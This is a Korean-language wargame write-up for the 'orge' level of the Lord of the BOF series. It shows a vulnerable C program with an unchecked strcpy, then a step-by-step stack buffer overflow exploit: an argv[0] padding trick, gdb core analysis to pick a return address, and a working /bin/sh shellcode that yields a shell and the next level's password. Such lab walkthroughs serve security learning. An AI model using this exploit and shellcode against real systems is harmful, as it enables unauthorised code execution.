# dakrelf -> orge

``` C
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orge
        - check argv[0]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // here is changed!
        if(strlen(argv[0]) != 77){
                printf("argv[0] error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

전 단계와 달라진 점은 argv[0]의 길이를 확인하는 함수가 추가된 것이다. argv[0] 즉, 실행 파일명(ex, ./orge, /tmp/dirorge/orge, ~/orge 등등)을 말한다.
원래의 실행 파일명은 ./orge이므로 '/'를 72개로 늘려서 payload를 작성해 주면 된다.

```
mkdir /tmp/dirorge
cd /tmp/dirorge
cp ~/orge .
```
위의 명령어로 orge파일을 tmp 디렉토리에 옮긴 후 시작하였다.

```
[darkelf@localhost dirorge]$ `python -c 'print "."+"/"*72+"orge"'` a
stack is still your friend.
```
위의 코드를 통해 argv[0]의 길이를 체크하는 조건문은 통과한 것을 알 수 있다. 뒤에 a는 argc를 체크하는 인자를 통과하기 위해서 작성하였다.
이제 저 코드와 argv[1], argv[2]를 이용해 payload를 작성해보자.

```
[darkelf@localhost dirorge]$ `python -c 'print "."+"/"*72+"orge"'` `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf "+"\x90"*10000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA¿¿¿¿
Segmentation fault (core dumped)
[darkelf@localhost dirorge]$ gdb -q -c core
Core was generated by `.////////////////////////////////////////////////////////////////////////orge A'.
Program terminated with signal 11, Segmentation fault.
#0  0xbfbfbfbf in ?? ()
```
argv[2]의 주소 (RET이 될 부분, NOP의 주소 중 한 곳을 고르면 됨)를 찾기 위해 core 파일을 확인해 봤다.

```
(gdb) x/80x $esp
(생략)
0xbffff7d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7e0:     0xbfbfbfbf      0x90909000      0x90909090      0x90909090
0xbffff7f0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff800:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff810:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff820:     0x90909090      0x90909090      0x90909090      0x90909090
```

RET을 0xbffff7f0로 사용하였다.

payload = argv[0]의 파일 명 수정한 코드 + argv[1](buf[40] + SFP[4] + RET[4]) + argv[2](SHELLCODE)
```
[darkelf@localhost dirorge]$ `python -c 'print "."+"/"*72+"orge"'` `python -c 'print "A"*44+"\xf0\xf7\xff\xbf "+"\x90"*10000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAð÷ÿ¿
bash$ my-pass
euid = 507
timewalker
```





